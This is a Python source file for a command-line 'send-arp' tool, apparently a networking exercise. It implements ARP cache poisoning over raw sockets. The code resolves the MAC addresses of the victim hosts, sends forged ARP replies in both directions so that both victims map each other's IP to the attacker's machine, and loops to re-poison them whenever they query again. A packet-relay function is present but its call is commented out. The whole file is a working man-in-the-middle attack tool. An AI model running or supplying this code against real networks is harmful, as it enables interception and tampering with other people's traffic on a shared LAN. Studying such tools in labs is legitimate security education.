
import fcntl
import socket
import struct
import sys
import netifaces as ni

#third party library
import headers


# argv error message func
def usage():
    print("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]")
    print("sample : send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.1 192.168.0.2")
    sys.exit()

# my mac get func
def get_mac(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
    except:
        print("No such device")
        sys.exit()
    return info[18:24]

# return my ip
def get_my_ip(ifname):
    ni.ifaddresses(ifname)
    ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
    return ip

# mac bytearray to string
def get_mac_string(mac):
    return ':'.join('%02x' % b for b in mac[:6])


def arp_broadcast(ifname,my_mac,my_ip,sender_ip):
    # 0x0806 ETH_P_ARP define
    s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))
    s.bind((ifname,socket.htons(0x0800)))
    my_arp=headers.arp_header(my_mac,my_ip,b'\x00\x00\x00\x00\x00\x00',sender_ip)
    my_arp.d_mac = b'\xff\xff\xff\xff\xff\xff'
    my_arp.s_mac=my_mac
    my_arp.eth_type=b'\x08\x06'
    my_arp.arp_request()
    arp_broadcast_packet=my_arp.make_arp_packet()
    s.send(arp_broadcast_packet)
    s.close()
    
    return

def arp_poison_send(ifname,my_mac,sender_mac,sender_ip,target_ip):
    my_arp=headers.arp_header(my_mac,target_ip,sender_mac,sender_ip)
    my_arp.d_mac =sender_mac
    my_arp.s_mac=my_mac
    my_arp.eth_type=b'\x08\x06'
    my_arp.arp_reply()
    arp_broadcast_packet=my_arp.make_arp_packet()

    # 0x0806 ETH_P_ARP define
    ss=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))
    ss.bind((ifname,socket.htons(0x0800)))
    #print(arp_broadcast_packet)
    print(ss.send(arp_broadcast_packet))
    ss.close()
    return
def arp_reply_receive(my_socket,sender_ip_net,target_ip_net):
    #s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))
    while True:
        #2048size buffer
        rpy_pkt=my_socket.recvfrom(2048)

        sender_arp_reply=headers.arp_header(packet=rpy_pkt[0])
        sender_arp_reply.arp_parser()
        if sender_ip_net==sender_arp_reply.sender_ip:

            # save sender ip, mac
            #sender_mac_ip.append([sender_arp_reply.sender_mac,sender_ip_net,sender_arp_reply.target_mac,target_ip_net])
            return sender_arp_reply.sender_mac,sender_ip_net,sender_arp_reply.target_mac,target_ip_net
        
def packet_relay(ifname,packet,d_mac):
    relay_packet=d_mac+packet[6:]
    #print(relay_packet)
    #print(d_mac)
    
    # 0x0806 ETH_P_ARP define
    s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))
    s.bind((ifname,socket.htons(0x0800)))
    s.send(relay_packet)
    s.close()
    
def main():
    ifname = sys.argv[1]

    # sender ip,mac list
    sender_target_mac_ip =[]

    my_mac=get_mac(ifname)
    my_ip = socket.inet_aton(get_my_ip(ifname))
    
    s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0806))

    for i in range(2,argc,2):
        sender_ip=sys.argv[i]
        target_ip=sys.argv[i+1]
        sender_ip_net=socket.inet_aton(sender_ip)
        target_ip_net=socket.inet_aton(target_ip)
        
        # get sender mac
        arp_broadcast(ifname,my_mac,my_ip,sender_ip_net)
        sender_arp_reply=arp_reply_receive(s,sender_ip_net,my_ip)
        #print(sender_arp_reply)
        
        # get target mac
        arp_broadcast(ifname,my_mac,my_ip,target_ip_net)
        target_arp_reply=arp_reply_receive(s,target_ip_net,my_ip)
        #print(target_arp_reply)
        sender_target_mac_ip.append([sender_arp_reply[0],sender_arp_reply[1],target_arp_reply[0],target_arp_reply[1]])
        #print(sender_target_mac_ip)
    
    # send poison reply
    for s_mac,s_ip,t_mac,t_ip in sender_target_mac_ip:
        # sender poison
        arp_poison_send(ifname,my_mac,s_mac,s_ip,t_ip)

        # target poison
        arp_poison_send(ifname,my_mac,t_mac,t_ip,s_ip)
        #sender_arp_reply=arp_reply_receive(sender_ip_net,my_ip)
        #print(s_mac,s_ip,t_ip)
    
    # if sender checks target, reply again
    while True:
        #2048size buffer
        chk_pkt=s.recvfrom(2048)
        sender_arp=headers.arp_header(packet=chk_pkt[0])
        sender_arp.arp_parser()
        for s_mac,s_ip,t_mac,t_ip in sender_target_mac_ip:
            # relay to target
            #if s_ip==sender_arp.sender_ip and sender_arp.target_ip==t_ip:
            if s_ip==sender_arp.sender_ip:
                
                #packet_relay(ifname,chk_pkt[0],t_mac)
                
                arp_poison_send(ifname,my_mac,s_mac,s_ip,t_ip)
                #arp_poison_send(ifname,my_mac,s_mac,s_ip,t_ip)
                    
                #print("#")
                
            # repoison to sender arp table
            #elif s_ip==sender_arp.sender_ip:
                #arp_poison_send(ifname,my_mac,my_ip,s_mac,s_ip,t_ip)
                #print(sender_arp.sender_ip)
        #break
    return
    
    

if __name__ == "__main__":

    argc=len(sys.argv)
    #print(argc)
    #print(argc%2)
    if argc<4 or argc%2!=0:
        usage()

    main()